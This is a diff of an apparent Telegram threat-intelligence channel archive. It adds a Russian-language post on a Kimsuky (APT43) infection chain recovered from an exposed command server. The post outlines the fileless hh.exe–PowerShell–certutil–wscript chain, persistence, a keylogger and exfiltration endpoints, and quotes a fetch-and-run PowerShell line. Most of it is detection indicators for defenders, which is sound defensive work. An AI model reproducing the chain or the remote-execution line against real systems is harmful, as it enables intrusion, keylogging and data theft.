@@ -1,8 +1,22 @@
 {
   "channel": "ThreatHuntingFather",
-  "last_update": "2026-04-13T10:51:29.168780+00:00",
-  "messages_count": 177,
+  "last_update": "2026-04-13T15:21:44.107300+00:00",
+  "messages_count": 179,
   "messages": [
+    {
+      "id": "1306",
+      "title": "Kimsuky (APT43, DPRK) засветил C2 с открытым directory listing. Breakglass Intelligence забрал полный исходник всех трёх стадий kill chain до ротации.",
+      "text": "Kimsuky (APT43, DPRK) засветил C2 с открытым directory listing. Breakglass Intelligence забрал полный исходник всех трёх стадий kill chain до ротации.\nLOLBin chain:\nhh.exe → powershell -windowstyle hidden → certutil -f -decode → wscript //b //e:vbscript → Execute(C2 response) - всё fileless\nStage 1 [6338b VBScript] - полный recon: OS, CPU, RAM, процессы (Win32_Process), AV (SecurityCenter2), директории Desktop/Docs/Downloads. Persistence: scheduled task «Edge Updater» PT60M → wscript OfficeUpdater_*.ini в System folder. Эксфильтрация → /api/finalservice.php\nStage 2 [449b VBScript]: Invoke-Expression (Invoke-RestMethod checkservice.php?idx=5)\nStage 3 [6234b PowerShell] - keylogger: GetAsyncKeyState + ToUnicode, clipboard poll каждые 1 сек, лог в %APPDATA%\\...\\Templates\\Office_Config.xml, эксфильтрация каждые 100–140 мин\n•Детали\nДва новых публичных эндпоинта: checkservice.php (доставка keylogger) и finalservice.php (приём данных) - в предыдущих отчётах отсутствовали\nUA с намеренными опечатками: Chremo/87.0.4280.141 и Edgo/87.0.664.75 - обходят keyword-фильтры, но уникальны для детекта\nФиксированный multipart boundary: ----c2xkanZvaXU4OTA - не рандомизируется, прямая сетевая сигнатура\nMutex: Global\\AlreadyRunning19122345\nC2 health check: GET /pc/index.php → «Million OK !!!!» - та же сигнатура, что Hunt.io задокументировал в декабре 2024, но стек обновлён: Win32/PHP 5.6 → Win64/PHP 8.2.\n79+ доменов, 5 IP за 9 дней - DAOU → UCloud HK → LightNode US\n• Что отслеживать\nProcess chain (HIGH):\nhh.exe → powershell.exe → certutil.exe -f -decode → wscript.exe //b //e:vbscript\nScheduled task (EventID 4698):\nTaskName: \\Edge Updater + Action: *wscript.exe*\nФайлы:\n%USERPROFILE%\\Links\\Link.dat / Link.ini\n%APPDATA%\\Microsoft\\Windows\\Templates\\Office_Config.xml\nOfficeUpdater_*_*_*.ini в system dir\nСеть:\nUA regex: /^(Chremo|Edgo)\\//\nURI: */bootservice.php?tag=*&query=* и */checkservice.php?idx=*\nPOST: */finalservice.php + boundary ----c2xkanZvaXU4OTA\nHTTP body: «Million OK !!!!»\n🔗 https://intel.breakglass.tech/post/kimsuky-chm-nidlog-c2-dump-full-payload-recovery\n🦔 THF",
+      "link": "https://t.me/ThreatHuntingFather/1306",
+      "pub_date": "2026-04-13T12:25:55+00:00"
+    },
+    {
+      "id": "1305",
+      "title": "Message 1305",
+      "text": "",
+      "link": "https://t.me/ThreatHuntingFather/1305",
+      "pub_date": "2026-04-13T12:03:40+00:00"
+    },
     {
       "id": "1304",
       "title": "[ATT&CK MATRIX v19]",
